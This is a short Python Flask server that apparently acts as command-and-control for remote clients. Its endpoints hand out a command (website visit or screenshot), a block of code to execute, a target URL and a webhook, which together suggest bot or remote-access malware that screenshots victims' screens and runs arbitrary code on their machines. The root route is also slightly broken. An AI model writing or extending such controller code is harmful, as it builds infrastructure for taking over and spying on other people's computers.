
from flask import Flask, jsonify

app = Flask(__name__)

WebsiteURL = ""
Webhook = None
Command = 1 # Preset commands are 1 [WEBSITE VISITOR], and 2 [SCREENSHOT].
Code = ""

@app.route("/")
def quit():
  return 400

@app.route("/command")
def command():
  return jsonify({"COMMAND": Command})

@app.route("/exec_code")
def exec_code():
  return jsonify({"CODE": Code})

@app.route("/website_url")
def website_url():
  return jsonify({"WEBSITE": WebsiteURL})

@app.route("/current_webhook")
def current_webhook():
  return jsonify({"WEBHOOK": Webhook})

if __name__ == "__main__":

  app.run()
